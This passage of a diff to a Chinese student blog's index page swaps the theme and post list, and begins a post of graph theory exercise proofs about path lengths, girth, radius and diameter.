@@ -1,249 +1,5288 @@
 <!DOCTYPE html>
-<html>
-    <head>
-    <meta charset="utf-8">
-    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
-    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
-    <title>jjppp | Blog of jjppp</title>
-    
-<link rel="stylesheet" href="/css/reset.css">
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
 
-    
-<link rel="stylesheet" href="/css/style.css">
 
-    
-<link rel="stylesheet" href="/css/markdown.css">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-    
-<link rel="stylesheet" href="/css/fonts.css">
+<link rel="stylesheet" href="/css/main.css">
 
-<meta name="generator" content="Hexo 6.2.0"></head>
-    <body>
-        <div class="paper">
-            <div class="paper-main">
-                
-                    <div class="header">
-    <a class="logo" href="/">jjppp</a>
-    <ul class="nav">
-        
-        <li><a href="/">首页</a></li>
-        
-        <li><a href="/archives">归档</a></li>
-        
-        <li><a href="/about">关于</a></li>
-        
-    </ul>
-</div>
-                
-                <div class="post-list">
-    
-    <div class="post">
-        <a class="post-title" href="/2021/04/09/%E5%9B%BE%E8%AE%BA%E4%B9%A0%E9%A2%98%E4%B9%B1%E5%81%9A/">图论习题乱做</a>
-        <div class="post-except">
-            图论中常常关心有限图，这样的图通常可以取最值、可以归纳，有一些比较好的性质(但是我也说不出几条来) 有些东西不会翻译，或者说不好翻译，就偷懒了( ### 证明：任意图$G$都存在长度为$\delta(G)+1$的path，存在长度为$\delta(G)$的circle 从图中取出最长的path $P$，考虑$P$的一个端点$a$，则必然有$N_G(a)\subseteq P$，否则我们可以找到另一个点扩展$P$使得它更长； 也就是说$|P|\ge |N_G(a)|+1\ge\
-            <a class="read-more" href="/2021/04/09/%E5%9B%BE%E8%AE%BA%E4%B9%A0%E9%A2%98%E4%B9%B1%E5%81%9A/"> ... </a>
-        </div>
-        <div class="post-date">2021.04.09</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2021/04/09/%E9%9B%86%E5%90%88%E8%AE%BA%E4%B9%A0%E9%A2%98%E4%B9%B1%E5%81%9A/">集合论习题乱做</a>
-        <div class="post-except">
-            ### 给定2个集合$A$和$B$，可以任意使用$\cap$、$\cup$、$\\$，可以任意使用$A$和$B$任意多次，最多可以得到多少本质不同的集合？对于给定n个集合的情况答案又是多少？ 这个问题比较巧妙。2个集合的时候，我们最多可以把全集划分为4个区域，除$\overline{A\cup B}$外每个区域都可以单独地取到，并且可以相互并起来 那么最后的答案就是$2^{4-1}&#x3D;8$， 推广一下，就是n个集合最多能将全集划分为$2^n$个互不相交的区域，且除了$
-            <a class="read-more" href="/2021/04/09/%E9%9B%86%E5%90%88%E8%AE%BA%E4%B9%A0%E9%A2%98%E4%B9%B1%E5%81%9A/"> ... </a>
-        </div>
-        <div class="post-date">2021.04.09</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2021/03/11/%E7%BE%A4%E8%AE%BA%E4%B9%A0%E9%A2%98%E4%B9%B1%E5%81%9A/">群论习题乱做</a>
-        <div class="post-except">
-            有一些在课上做过了就没放(而且都还是*题，拿来入门，难顶….) 当然后来再补也说不定。拿不准的翻译就照抄原文。 ### 令$G$是$n$阶有限群，$S$是$G$的子集，且$2|S|&gt;|G|$，试证明$\forall a\in G$都$\exists b,c\in S$使得$a&#x3D;bc$ 这题有点巧妙。注意到$S\subseteq G$，我们构造$T&#x3D;\left\{x^{-1}|x\in S\right\}$，则任意取$a\in G$，构造$aT&#x3
-            <a class="read-more" href="/2021/03/11/%E7%BE%A4%E8%AE%BA%E4%B9%A0%E9%A2%98%E4%B9%B1%E5%81%9A/"> ... </a>
-        </div>
-        <div class="post-date">2021.03.11</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2021/03/07/CSAPP%E5%AE%9E%E9%AA%8C5-cachelab/">CSAPP实验5: cachelab</a>
-        <div class="post-except">
-            理论上还有第个perflab…. ## Part A 之前寒假的时候beginend说过cachelab很难，但是感觉做下来还行？也可能是他把malloclab记错成了cachelab也说不定( 不管了。Part A就是要按照书上cache memory的组织结构写一个简单的判断器，即给定若干读和写，来判断每次对内存的操作是&#x2F;否命中缓存。事实上开一个三维数组就好了(如果不实现Blocks甚至只需要二维) 不过这一次还是学到很多东西的，这里罗列一下 1. `getop
-            <a class="read-more" href="/2021/03/07/CSAPP%E5%AE%9E%E9%AA%8C5-cachelab/"> ... </a>
-        </div>
-        <div class="post-date">2021.03.07</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2021/02/19/%E5%A4%A7%E4%B8%80%E4%B8%8A%E5%AD%98%E6%B4%BB%E7%BB%8F%E9%AA%8C/">大一上存活经验</a>
-        <div class="post-except">
-            ## 大一上存活经验 希望能给下一届的小朋友留点存活经验，毕竟俺也没有真正意义上的直系学长….真是残念 现在有点怕明年没有直系学弟学妹了（悲 ### 九月 开学前几天就到了南京，热得一言难尽。晚上骑车去了鼓楼新街口，宇宙中心.jpg 宿舍分配很迷，18是填表配对、19是生日配对、20是生源地配对，导致我带去的土特产无人稀罕。感觉怎么想都是18科学啊（摔 军训据说水分单调递增，时间甚至只有两周，唯一的困难在于早起。期待了很久的打靶只用上了电子枪，军训的话人均85，神枪手和优秀营
-            <a class="read-more" href="/2021/02/19/%E5%A4%A7%E4%B8%80%E4%B8%8A%E5%AD%98%E6%B4%BB%E7%BB%8F%E9%AA%8C/"> ... </a>
-        </div>
-        <div class="post-date">2021.02.19</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2021/02/17/CSAPP%E5%AE%9E%E9%AA%8C4-archlab/">CSAPP实验4: archlab</a>
-        <div class="post-except">
-            留坑待填，还没看课本（囧 照例说一下前置姿势 本次实验最大的难点估计在于配置实验环境，找了一整天的搜索引擎发现还是出墙香…..我在本次实验中遇到了如下情况： ![](https://img2020.cnblogs.com/blog/1010529/202102/1010529-20210219015459676-1512313102.png) 想了很久都想不到要怎么解决，翻了翻`yas.h`甚至没有`#ifndef`，总不可能是CMU的人写错了？ 最后还是在Stack Ove
-            <a class="read-more" href="/2021/02/17/CSAPP%E5%AE%9E%E9%AA%8C4-archlab/"> ... </a>
-        </div>
-        <div class="post-date">2021.02.17</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2021/02/14/%E5%8D%8A%E9%9F%B3%E9%98%B6%E5%8F%A3%E7%90%B4%E8%B0%B1%E5%90%88%E8%BE%91/">半音阶口琴谱合辑</a>
-        <div class="post-except">
-            最早想玩口琴是高三的暑假。啥也不懂就直接jd了复音，到手以后发现复音没有半音，很多曲子没法吹，谱子也不好找，舌伴奏分解和弦更是难得口腔发麻，唯一的优点大概是便宜、单音好吹、音色醇厚了(这里有三个了吧喂)。 年前入手了一把铁鹅的追梦人，不得不说半音阶吹起来感觉还是很不同的。孔位我还在适应，推键也还在掌握，不过至少能吹很多曲子了;-P 这里就放一点从各处搜罗来的半音阶琴谱，也算是分享吧？还不会看五线谱，先吹着再说吧。希望好听的曲子都可以找到听众 **作一点小约定：1234567分
-            <a class="read-more" href="/2021/02/14/%E5%8D%8A%E9%9F%B3%E9%98%B6%E5%8F%A3%E7%90%B4%E8%B0%B1%E5%90%88%E8%BE%91/"> ... </a>
-        </div>
-        <div class="post-date">2021.02.14</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2021/02/08/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%B8%B8%E8%A7%81%E8%AF%81%E6%98%8E/">高等代数复习笔记 常见证明</a>
-        <div class="post-except">
-            关于矩阵的秩，王萼芳的书上给了一个比较简单的证明，丘维声的书上给了一个比较容易理解的证明，这里记一下复习复习，算是加深理解 ## 方法一 — **引理**：齐次线性方程组$A\bold{x}&#x3D;\bold{0}$只有零解当且仅当矩阵$A$的行秩$\ge$未知数个数。 引理的证明比较简单，只需要证明初等行变换不改变行秩，再观察$A$化成阶梯形矩阵之后自由变量的数量就好了 不妨设一个矩阵$A_{s\times n}$，且有$s\le n$，我们首先证明行秩$r_s\le$
-            <a class="read-more" href="/2021/02/08/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%B8%B8%E8%A7%81%E8%AF%81%E6%98%8E/"> ... </a>
-        </div>
-        <div class="post-date">2021.02.08</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2021/02/04/CSAPP%E5%AE%9E%E9%AA%8C3-attacklab/">CSAPP实验3 : attacklab</a>
-        <div class="post-except">
-            佛了，写到lab3才知道有writeup这种东西… # CI Part — ## touch1 — 很简单的题，但是做了很久才发现是数错了的问题….面壁中 ``` asm 00000000004017a8 : 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 4017b4: b8 01 00 00 00 mov $0x1,%
-            <a class="read-more" href="/2021/02/04/CSAPP%E5%AE%9E%E9%AA%8C3-attacklab/"> ... </a>
-        </div>
-        <div class="post-date">2021.02.04</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2021/01/24/CSAPP%E5%AE%9E%E9%AA%8C2-bomblab/">CSAPP实验2 : bomblab</a>
-        <div class="post-except">
-            观察之后还可以发现有所谓的`secret_phase`和`func7`之类的东西，但是感觉差不太多了也就不太想做…就这样吧 # 前置姿势&#x2F;技能 — 这里记一下做lab需要的前置姿势&#x2F;技能,尽量不和理论方面的东西重叠吧… 编译实际上就是把源代码变成一堆CPU指令的过程(在这里到这个程度就够了) GCC使用的是叫`ATT`格式的汇编,和`Intel`格式的汇编有很多不一样,最显著的就是操作元素的顺序…看文档的时候要小心 编译产生`.s`文件: ```gcc -
-            <a class="read-more" href="/2021/01/24/CSAPP%E5%AE%9E%E9%AA%8C2-bomblab/"> ... </a>
-        </div>
-        <div class="post-date">2021.01.24</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2021/01/14/CSAPP%E5%AE%9E%E9%AA%8C1-datalab/">CSAPP实验1 : datalab</a>
-        <div class="post-except">
-            考试周除了学习什么都好玩，偶然发现了B站上的“精翻”视频，就冲了 第一章的视频还没看完(太长了quq),这里也只是写了整形的lab,写了大概有一整天 明天烤完高代就滚回来填这个lab、课程笔记、导论4、集合论习题的坑…好像有点多,不管了 这些只在本地btest过,不保证能对…如果有错或者有更好的做法欢迎指正! upd:做完了，爽耶 ![](https://img2020.cnblogs.com/blog/1010529/202101/1010529-2021011923533
-            <a class="read-more" href="/2021/01/14/CSAPP%E5%AE%9E%E9%AA%8C1-datalab/"> ... </a>
-        </div>
-        <div class="post-date">2021.01.14</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2021/01/06/%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/">信息与计算科学导论复习笔记三</a>
-        <div class="post-except">
-            这里的递归实际上也可以理解为递推 ##Karatsuba算法 计算界次为$n$的多项式乘积，$naive$做法需要计算$n^2$次 一个本科生(！！！)提出了这样的算法。考虑计算$\left(ax+b\right)\left(cx+d\right)$ 展开就是$acx^2+\left(ad+bc\right)x+bd$，其中$ac$和$bd$无法避免，而$\left(ad+bc\right)&#x3D;\left(a+b\right)\left(c+d\right)-ac-b
-            <a class="read-more" href="/2021/01/06/%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"> ... </a>
-        </div>
-        <div class="post-date">2021.01.06</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2021/01/06/%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/">信息与计算科学导论复习笔记二</a>
-        <div class="post-except">
-            ##集合的大小 有限集合的大小很容易比较，只需要数一数，比一比就完了 而无限集不能这么做。我们在这里规定集合$A$与$B$大小相等当且仅当存在$f: A\mapsto B$为双射 定理：无限集至少和它的一个真子集有双射 证明：考虑$A$，由选择公理，我们可以取出$B\subset A$且$B$可数，那么$f:A\mapsto A\backslash B_0$就可以取$f(x)&#x3D;\left\{\begin{aligned}\begin{equation}B_{i+1}
-            <a class="read-more" href="/2021/01/06/%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"> ... </a>
-        </div>
-        <div class="post-date">2021.01.06</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2021/01/06/%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/">信息与计算科学导论复习笔记一</a>
-        <div class="post-except">
-            信息与计算科学导论一 ##罗素悖论 考虑这么一个集合： $S&#x3D;\left\{T|T\not\in S\right\}$ 考虑一个集合内的元素$x$，若$x\in S$，则根据定义$x\not\in S$，矛盾 若$x\not\in S$，则根据定义有$x\in S$，矛盾 我们找不到这样一个集合，这就是大名鼎鼎的罗素悖论 ##公理集合论 悖论的源头在于构建集合的描述性方法，我们在使用这个方法的时候出现了所谓“自引用”的情况 为了体系的和谐与自洽，数学家们提出了公理集
-            <a class="read-more" href="/2021/01/06/%E4%BF%A1%E6%81%AF%E4%B8%8E%E8%AE%A1%E7%AE%97%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"> ... </a>
-        </div>
-        <div class="post-date">2021.01.06</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2021/01/01/%E6%95%B0%E5%AD%A6%E5%88%86%E6%9E%90%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%AE%9E%E6%95%B0%E5%AE%8C%E5%A4%87%E6%80%A7%E7%9A%84%E5%85%AD%E4%B8%AA%E5%AE%9A%E7%90%86/">数学分析复习笔记 实数完备性的六个定理</a>
-        <div class="post-except">
-            实数完备性的几个定理可以互相推导，这里给出了一个比较简单的完整推导链条 对于没有写到的推导可以通过旁敲侧击推导出这里的条件再继续（迂回战术） # 1. 有界必有确界 — 如果$\exists u$使得$\forall x\in S$都有$x\le u$,那么$S$有上确界 上确界：记$U&#x3D;\sup\left\{S\right\}$，则$\forall x\in S$都有$x\le U$，且$\forall \epsilon&gt;0$，$\exists x_0\in
-            <a class="read-more" href="/2021/01/01/%E6%95%B0%E5%AD%A6%E5%88%86%E6%9E%90%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%AE%9E%E6%95%B0%E5%AE%8C%E5%A4%87%E6%80%A7%E7%9A%84%E5%85%AD%E4%B8%AA%E5%AE%9A%E7%90%86/"> ... </a>
-        </div>
-        <div class="post-date">2021.01.01</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2020/12/27/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">C语言学习笔记</a>
-        <div class="post-except">
-            更新：因为开始写PA2了，因此决定重回这个坑，顺便记录一下解决一些C问题的方法，不一定和语法相关 — 现在才知道 oi 用的是 C-with-STL… 感觉自己对这个看起来很单纯的语言仍然不够了解 打算仔仔细细地写一写自己不太会的东西，包括与 C++ 不同的语法、宏(macro)的技巧、指针的技巧等等 # 语法 ## `enum` 可以利用`enum`的特点来引入最大下标开数组 ``` enum {PC,R1,R2,…,R7,R_SIZE}; ``` 那么这里的`R_SIZE
-            <a class="read-more" href="/2020/12/27/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"> ... </a>
-        </div>
-        <div class="post-date">2020.12.27</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2020/12/26/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E7%AC%94%E8%AE%B01-Introduction/">编译原理 笔记1 Introduction</a>
-        <div class="post-except">
-            看的是英文版的龙书,各种翻译看看就好… 大概前半段是课本，后半段是网课的笔记。因为课程好像都不讲Chap. 2，所以下一节的笔记大概就没有课堂内容了 # 1.1 Language Processors 词汇: intermediate 中间的 compile 编译 interpret 解释 assemble 汇编 relocatable 可重定位的 编译器指的是将源代码翻译成等价的另一种语言的程序的程序(饶舌) 编译器的一项重要职责是检测error 编译语言的编译和执行是分开
-            <a class="read-more" href="/2020/12/26/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E7%AC%94%E8%AE%B01-Introduction/"> ... </a>
-        </div>
-        <div class="post-date">2020.12.26</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2020/12/25/BF%E8%A7%A3%E9%87%8A%E5%99%A8%E5%92%8C%E5%87%A0%E4%B8%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BB%A5%E5%8F%8A%E5%85%B3%E4%BA%8E%E5%A4%9A%E6%96%87%E4%BB%B6%E7%BC%96%E7%A8%8B%E7%9A%84%E7%90%86%E8%A7%A3/">BF解释器和几个小程序以及关于多文件编程的理解</a>
-        <div class="post-except">
-            上SICP的时候樾哥提到了一个叫图灵完备的概念，啥是图灵完备呢？简单说就是能模拟图灵机的所有操作的语言就可以说是图灵完备的，它的计算能力和图灵机至少是等价的 然后有这么一个很小的语言Brainfuck，它有一个类似射线的有格纸带，一个可以任意移动的指针 规定，”&lt;”、”&gt;”、”,”、”.”、”+”、”-“分别表示左移、右移、读入、输出、增加1、减少1，这个做起来是很简单的 然后是”[“和”]“，其等价于 while (pointer-&gt;value !&#x3
-            <a class="read-more" href="/2020/12/25/BF%E8%A7%A3%E9%87%8A%E5%99%A8%E5%92%8C%E5%87%A0%E4%B8%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BB%A5%E5%8F%8A%E5%85%B3%E4%BA%8E%E5%A4%9A%E6%96%87%E4%BB%B6%E7%BC%96%E7%A8%8B%E7%9A%84%E7%90%86%E8%A7%A3/"> ... </a>
-        </div>
-        <div class="post-date">2020.12.25</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2020/12/15/%E6%9C%9F%E6%9C%AB%E5%B0%8F%E4%BD%9C%E4%B8%9A%E2%80%94%E2%80%942048%E5%B0%8F%E6%B8%B8%E6%88%8F/">期末小作业——2048小游戏</a>
-        <div class="post-except">
-            ## 写在前面 — 程设期末没考试，但是要做一个2048游戏的小作业 虽然tw老湿并没有作出格外的要求，但我还是上了QT写了图形化的界面（虽然写的很丑） 这里并没有用上signal和slot之类的特性，因为暂时还用不上。。希望后面能发现更好的写法 在上了半个学期的SICP(实验课)之后体会到了python里变量和指针各自的好处，于是现在更喜欢指针和变量分的比较开的cpp了。这是第一次主要使用指针和各种类的cpp programming，感觉写完一遍下来对cpp的理解有了一点变
-            <a class="read-more" href="/2020/12/15/%E6%9C%9F%E6%9C%AB%E5%B0%8F%E4%BD%9C%E4%B8%9A%E2%80%94%E2%80%942048%E5%B0%8F%E6%B8%B8%E6%88%8F/"> ... </a>
-        </div>
-        <div class="post-date">2020.12.15</div>
-    </div>
-    
-    <div class="post">
-        <a class="post-title" href="/2020/11/23/%E5%87%A0%E4%B8%AA%E5%85%B3%E4%BA%8E%E9%9B%86%E5%90%88%E7%9A%84%E6%9C%89%E8%B6%A3%E8%AF%81%E6%98%8E/">几个关于集合的有趣证明</a>
-        <div class="post-except">
-            在离散数学的第一堂课就被介绍了Set和Proper Class的区别。 与高中内容不同，现代数学中并不是任取一些元素都能组成一个Set，某些东西归在一起只能形成Proper Class（因为这个东西不满足集合的一些性质） 根据ZFC公理系统，我们可以知道关于集合的若干条公理，也就是说满足这些的才是集合，而推断某个东西不是集合常用反证的方法，下面来看几个栗子 1. Prove that the set of all sets is a proper class. 这个比较简单。
-            <a class="read-more" href="/2020/11/23/%E5%87%A0%E4%B8%AA%E5%85%B3%E4%BA%8E%E9%9B%86%E5%90%88%E7%9A%84%E6%9C%89%E8%B6%A3%E8%AF%81%E6%98%8E/"> ... </a>
-        </div>
-        <div class="post-date">2020.11.23</div>
-    </div>
-    
-</div>
 
-<div class="paginator">
-    <a class="extend prev" rel="prev" href="/page/3/">上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/">下一页</a>
-</div>
 
-                <div class="footer">
-    <span>Copyright © 2022 jjppp</span>
-    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這Li</a></span>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Young, Simple &amp; Naive">
+<meta property="og:type" content="website">
+<meta property="og:title" content="jjppp">
+<meta property="og:url" content="http://example.com/page/4/index.html">
+<meta property="og:site_name" content="jjppp">
+<meta property="og:description" content="Young, Simple &amp; Naive">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="jpwang">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/page/4/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/4/index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>jjppp</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">jjppp</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Blog of jjppp</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
 </div>
 
 
-<link rel="stylesheet" href="/css/a11y-dark.min.css">
 
 
-<script src="/js/highlight.min.js"></script>
 
 
-<script src="/js/highlightjs-line-numbers.js"></script>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">jpwang</p>
+  <div class="site-description" itemprop="description">Young, Simple & Naive</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">84</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
 
 
-<script>
-    hljs.initHighlightingOnLoad();
-    hljs.initLineNumbersOnLoad();
-</script>
 
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/09/%E5%9B%BE%E8%AE%BA%E4%B9%A0%E9%A2%98%E4%B9%B1%E5%81%9A/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/04/09/%E5%9B%BE%E8%AE%BA%E4%B9%A0%E9%A2%98%E4%B9%B1%E5%81%9A/" class="post-title-link" itemprop="url">图论习题乱做</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-04-09 23:01:00" itemprop="dateCreated datePublished" datetime="2021-04-09T23:01:00+08:00">2021-04-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:47:11" itemprop="dateModified" datetime="2022-06-19T09:47:11+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          图论中常常关心有限图，这样的图通常可以取最值、可以归纳，有一些比较好的性质(但是我也说不出几条来)
+
+有些东西不会翻译，或者说不好翻译，就偷懒了(
+
+
+
+### 证明：任意图$G$都存在长度为$\delta(G)+1$的path，存在长度为$\delta(G)$的circle
+
+从图中取出最长的path $P$，考虑$P$的一个端点$a$，则必然有$N_G(a)\subseteq P$，否则我们可以找到另一个点扩展$P$使得它更长；
+
+也就是说$|P|\ge |N_G(a)|+1\ge\delta(G)+1$；
+
+再从中取出$b\in N_G(a)$使得$b$在$P$上最远离$a$，则$ap_0p_1\dots b$至少有$\delta(G)$个点，这个circle长度为$\delta(G)$
+
+
+
+### 任意包含至少一个circle的图$G$满足$g(G)\le 2diamG+1$
+
+这里$g(G)$指的是$G$中的最小circle的长度，$diam G$指的是$G$的直径(任意两点的最长距离)
+
+不妨取出$G$中的最小circle，记为$C$，则$diam G=\max\limits_{\forall x,y\in V(G)} dist(x,y)\ge\max\limits_{\forall x,y\in V(C)}{dist(x,y)}\ge\lfloor\frac{|C|}{2}\rfloor=\lfloor\frac{g(G)}{2}\rfloor$
+
+于是就有题目给的式子了
+
+
+
+### 对任意图$G$有$rad G\le diam G\le 2rad G$
+
+这里$rad G$是图$G$的半径，定义为$\min\limits_{x\in V(G)}\max\limits_{y\in V(G)} dist(x,y)$。同时可定义中心点$v$为取到$rad G$时的$x$
+
+不等式的前半是显然的，半径不会超过直径；
+
+考虑取出中心点$v$，则$\forall x,y\in V(G)$，有$dist(x,y)\le dist(x,v)+dist(v,y)\le rad G+rad G=2rad G$
+
